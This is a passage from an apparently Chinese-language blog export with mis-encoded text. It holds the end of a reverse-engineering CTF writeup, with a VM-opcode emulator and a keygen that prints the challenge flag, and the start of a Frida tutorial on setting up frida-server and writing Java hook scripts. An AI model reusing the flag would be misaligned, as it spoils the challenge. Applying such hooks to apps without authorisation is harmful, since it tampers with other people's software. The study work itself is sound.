<span class="number">0x25</span>, <span class="number">0xFD</span>, <span class="number">0x6F</span>, <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0xB0</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x3E</span>, <span class="number">0xFD</span>, <span class="number">0x73</span>, <span class="number">0xED</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>]</span><br><span class="line">pointer_to_opcode = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pointer_to_opcode &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================opcode: &quot;</span> + <span class="built_in">hex</span>(opcode[pointer_to_opcode]), opcode[pointer_to_opcode] - <span class="number">0x67</span> + <span class="number">4</span>, <span class="string">f&quot;is excuted=======================opcode at <span class="subst">&#123;pointer_to_opcode&#125;</span>=====================&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x66</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x67</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] += reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] += reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x68</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] -= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] -= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x69</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] *= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] *= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6A</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] /= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] /= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6B</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] += 1&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6C</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] -= 1&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] -= <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6D</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] ^= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] ^= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6E</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] &amp;= reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] &amp;= reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x6F</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;pop reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] in stack&quot;</span>)</span><br><span class="line">        esp -= <span class="number">1</span></span><br><span class="line">        stack[esp] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x70</span>:</span><br><span class="line">        data = opcode[pointer_to_opcode + <span class="number">1</span>] &lt;&lt; <span class="number">24</span> | opcode[pointer_to_opcode + <span class="number">2</span>] &lt;&lt; <span class="number">16</span> | opcode[pointer_to_opcode + <span class="number">3</span>] &lt;&lt; <span class="number">8</span> | opcode[pointer_to_opcode + <span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pop &quot;</span> + <span class="built_in">hex</span>(data) + <span class="string">&quot; in stack&quot;</span>)</span><br><span class="line">        esp -= <span class="number">1</span></span><br><span class="line">        stack[esp] = data</span><br><span class="line">        pointer_to_opcode += <span class="number">5</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x71</span>:</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = stack[esp]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;pop <span class="subst">&#123;stack[esp]&#125;</span> out to reg[<span class="subst">&#123;opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>&#125;</span>] and esp += 1&quot;</span>)</span><br><span class="line">        esp += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x72</span>:</span><br><span class="line">        <span class="built_in">print</span>(reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] = reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>]  &amp; <span class="number">0xf</span>) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x73</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;] = input[&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] = input_text[k]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x74</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input[&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;] = reg[&quot;</span> + <span class="built_in">str</span>(opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + <span class="string">&quot;]&quot;</span> )</span><br><span class="line">        input_text[k] = reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>]</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x75</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">3</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode - opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg[3] = <span class="subst">&#123;reg[<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            reg[<span class="number">3</span>] -= <span class="number">1</span></span><br><span class="line">            pointer_to_opcode -= opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x76</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] == reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>]:</span><br><span class="line">            reg[<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        reg[<span class="number">4</span>] = <span class="number">1</span> <span class="keyword">if</span> reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>] &gt; reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>] <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;set reg[4] to&quot;</span>, reg[<span class="number">4</span>], <span class="string">&quot;cause&quot;</span>, reg[opcode[pointer_to_opcode + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>], reg[opcode[pointer_to_opcode + <span class="number">1</span>] &amp; <span class="number">0x0F</span>])</span><br><span class="line">        pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x77</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x78</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x79</span>:</span><br><span class="line">        <span class="keyword">if</span> reg[<span class="number">4</span>] == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jump to&quot;</span>, <span class="built_in">hex</span>(pointer_to_opcode + opcode[pointer_to_opcode + <span class="number">1</span>]))</span><br><span class="line">            pointer_to_opcode += opcode[pointer_to_opcode + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not jump cause reg[4] = &quot;</span>, reg[<span class="number">4</span>])</span><br><span class="line">            pointer_to_opcode += <span class="number">2</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7A</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;k++&quot;</span>)</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7B</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;k--&quot;</span>)</span><br><span class="line">        k -= <span class="number">1</span></span><br><span class="line">        pointer_to_opcode += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> opcode[pointer_to_opcode] == <span class="number">0x7C</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">            <span class="built_in">print</span>(opcode[pointer_to_opcode + <span class="number">1</span>], <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;opcode[&quot;</span> + <span class="built_in">str</span>(pointer_to_opcode + i) + <span class="string">&quot;] ^= 0x66&quot;</span>)</span><br><span class="line">            stack[esp + i] ^= <span class="number">0x66</span></span><br><span class="line">        pointer_to_opcode += <span class="number">16</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pointer_to_opcode += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°åŠ å¯†è¿‡ç¨‹å°±æ˜¯flagçš„æ¯ä¸€ä½+&#x3D;ä¸‹ä¸€ä½(é™¤æœ€åä¸€ä½) ç„¶åå†é€†åºæ¯ä¸€ä½^&#x3D;ä¸Šä¸€ä½(é™¤ç¬¬ä¸€ä½) æ®æ­¤å†™å‡ºkeygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0xC7</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xE5</span>, <span class="number">0x08</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xAF</span>, <span class="number">0xCD</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xBF</span>, <span class="number">0x1F</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x68</span>, <span class="number">0xFE</span>, <span class="number">0x25</span>, <span class="number">0xFD</span>, <span class="number">0x6F</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0xB0</span>, <span class="number">0x21</span>, <span class="number">0x8B</span>, <span class="number">0x3E</span>, <span class="number">0xFD</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0xED</span>, <span class="number">0x90</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    enc[i] ^= enc[i - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    enc[i - <span class="number">1</span>] -= enc[i]</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># begin&#123;r3@11y_A_B4by_34$y_FK_Vm!&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>Fridaå­¦ä¹ è®°å½•</title>
    <url>/2024/05/10/Frida%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹å­¦ä¹ Fridaçš„å†ç¨‹</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>é›·ç”µæ¨¡æ‹Ÿå™¨(ç‰ˆæœ¬9.0.70.0)çš„å®‰å“ç‰ˆæœ¬ä¸ºAndroid9 å¤„ç†å™¨æ¡†æ¶ä¸ºx86_x64 å»ºè®®ä½¿ç”¨</p>
<p><a href="https://github.com/frida/frida/releases/download/14.2.18/frida-server-14.2.18-android-x86_64.xz">Frida Server14.2.18</a> + Python3.8 + Frida14.2.18(pip install frida&#x3D;&#x3D;14.2.18, frida-tools&#x3D;&#x3D;9.2.5)çš„ç¯å¢ƒé…ç½®</p>
<p>ä¸‹è½½å®ŒæœåŠ¡å™¨åä½¿ç”¨<code>adb</code>å°†å…¶ç§»å…¥æ¨¡æ‹Ÿå™¨ä¸­:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb -s emulator-5554 push fs \data\local\tmp</span><br><span class="line">adb -s emulator-5554 shell &quot;chmod 777 \data\local\tmp\fs&quot;</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><p>åœ¨æ¨¡æ‹Ÿå™¨ä¸Šå®‰è£…<code>frida-server</code>åç”¨<code>adb</code>å‘½ä»¤<code>adb -s deviceID shell &quot;/data/local/tmp/fs&amp;&quot;</code>å¯ç”¨æœåŠ¡å™¨ æ­¤æ—¶å†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¿›è¡Œç«¯å£è½¬å‘:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å¯ä»¥ä½¿ç”¨<code>frida-ps -U</code>æ˜¾ç¤ºè¿›ç¨‹å’ŒåŒ…å å‡è®¾å·²ç»å†™å¥½hookè„šæœ¬<code>hook.js</code> å¹¶ä¸”è¦hookçš„ç¨‹åºæ­£åœ¨è¿è¡Œ å¯ä»¥ä½¿ç”¨<code>frida -U -f åŒ…å -l hook.js</code>å°†è„šæœ¬æ³¨å…¥ç¨‹åºä¸­</p>
<h2 id="hookè„šæœ¬ç¼–å†™"><a href="#hookè„šæœ¬ç¼–å†™" class="headerlink" title="hookè„šæœ¬ç¼–å†™"></a>hookè„šæœ¬ç¼–å†™</h2><h3 id="hookç»“æœå’Œå‚æ•°-ä¿®æ”¹ç»“æœ"><a href="#hookç»“æœå’Œå‚æ•°-ä¿®æ”¹ç»“æœ" class="headerlink" title="hookç»“æœå’Œå‚æ•° ä¿®æ”¹ç»“æœ"></a>hookç»“æœå’Œå‚æ•° ä¿®æ”¹ç»“æœ</h3><p>ä»¥ä»¥ä¸‹çš„åŒ…ä¸ºä¾‹å­:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.whathappened.MyJNI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myjni</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;whathappened&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">getstr</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    String <span class="title function_">func</span><span class="params">(String x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getstr</code>æ˜¯ä¸€ä¸ªJNIæ³¨å†Œçš„nativeå‡½æ•° æ²¡æœ‰å‚æ•°åªæœ‰è¿”å›å€¼ å¯ä»¥ä½¿ç”¨è¿™ä¸ªè„šæœ¬æ¥hookç»“æœ:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(        <span class="comment">//hookè„šæœ¬è¦æ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);    <span class="comment">//æ‰¾åˆ°ç›®æ ‡ç±»å¹¶é‡è½½åˆ°æŒ‡å®šçš„å˜é‡ä¸­</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Myjni</span>.<span class="title function_">getstr</span>();        <span class="comment">//ä¸»åŠ¨è°ƒç”¨å¹¶è·å–è¿™ä¸ªç±»ä¸­çš„getstrå‡½æ•°æ‰§è¡Œçš„ç»“æœ</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>å¯¹funcå‡½æ•°å¦‚æœæƒ³æ‰“å°å‚æ•°å’Œç»“æœçš„è¯éœ€è¦åŒºåˆ†é‡è½½:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);</span><br><span class="line">        <span class="title class_">Myjni</span>.<span class="property">func</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x, y</span>)&#123;    <span class="comment">//æ˜ç¡®é‡è½½ç±»å‹</span></span><br><span class="line">            <span class="keyword">var</span> origin_res = <span class="variable language_">this</span>.<span class="title function_">func</span>(x, y);    <span class="comment">//è°ƒç”¨åŸå‡½æ•°</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Origin call:func(&quot;</span> + x + <span class="string">&quot;, &quot;</span> + y + <span class="string">&quot;) -&gt;&quot;</span> + origin_res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Myjni</span>.<span class="property">func</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span 